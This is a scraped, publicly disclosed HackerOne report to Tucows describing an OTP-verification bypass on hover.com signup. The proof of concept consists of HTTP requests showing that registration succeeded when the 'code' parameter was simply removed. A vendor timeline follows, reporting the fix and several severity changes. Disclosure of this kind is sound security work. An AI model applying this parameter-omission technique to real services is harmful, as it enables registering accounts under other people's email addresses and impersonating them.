---
title: "Business Logic Error – Bypass of OTP Verification During Signup on hover.com"
author: c0rvuz
url: https://hackerone.com/reports/3255473
date_published: 2025-07-16
date_scraped: 2026-11-17
platform: hackerone
disclosed_report: https://hackerone.com/reports/3255473
bounty: not stated
vuln_class: business-logic
---

<!-- Raw scraped text below. Public, non-paywalled content only. -->

Report #3255473 to Tucows (VDP). Status: Resolved. Severity history: medium 6.5, then 5.3, later shown as None (0.0) after an asset reassignment correction by the program. Weakness: Business Logic Errors. Bounty: None (VDP). Disclosed September 2, 2025.

## Report body (c0rvuz, July 16, 2025)

An attacker can register an account on www.hover.com using any email address without passing the required OTP verification. By omitting the code parameter entirely from the signup request, the backend completes the registration and returns a valid session. This constitutes a bypass of the OTP verification mechanism and a business logic error with potential for abuse, impersonation.

### PoC

1. Normal request to the signup endpoint:

```
POST /signup HTTP/2
Host: www.hover.com
Cookie: [REDACTED]
Referer: https://www.hover.com/signup
Content-Type: application/json;charset=UTF-8
Origin: https://www.hover.com
(other standard browser headers omitted)

{
 "account": {
  "terms_version": 2,
  "first_name": "[REDACTED]",
  "last_name": "Sec",
  "email": "[REDACTED]",
  "username": "[REDACTED]",
  "password": "[REDACTED]",
  "token": null,
  "code": "624187",
  "tosValues": { "consent": true, "newsletter": true }
 }
}
```

2. Bypass by deleting the `code` parameter entirely:

```
{
 "account": {
  "terms_version": 2,
  "first_name": "[REDACTED]",
  "last_name": "Sec",
  "email": "[REDACTED]",
  "username": "[REDACTED]",
  "password": "[REDACTED]",
  "token": null,
  "tosValues": { "consent": true, "newsletter": true }
 }
}
```

Response:

```
HTTP/2 200 OK
{"success": true}
```

3. Check email, the registration succeeded (screenshot attached, not captured here).

### Impact (as stated)
- Bypasses OTP verification intended to prove email ownership
- Allows anyone to register accounts using emails they don't own
- Can prevent real users from registering
- May allow spam/abuse at scale
- Could aid phishing or impersonation if the system sends emails

## Timeline / vendor responses
- July 26, 2025: HackerOne triage changed status to Pending program review.
- Triage analyst: passed preliminary analyst review, assessed in depth.
- Tucows staff: confirmed the bug is within scope of the VDP; status Triaged (Aug 13, 2025).
- Aug 19, 2025: severity adjusted medium 6.5 to 5.3 "to more accurately represent the impact"; closed as Resolved, fix applied.
- Researcher asked to disclose; Tucows confirmed and asked for username/password redaction; disclosed Sept 2, 2025.
- Oct 2025: Tucows staff changed scope and severity several times, then stated "this was an incorrect asset reassignment"; severity ended as none. Researcher asked why severity went to none (no answer shown).

## Metadata
Reported on July 16, 2025. Reported to Tucows (VDP), managed. Participants: c0rvuz, msahai01-tc, mmeintker-tc, h1_analyst_layla, h1_analyst_dante. CVE: none.
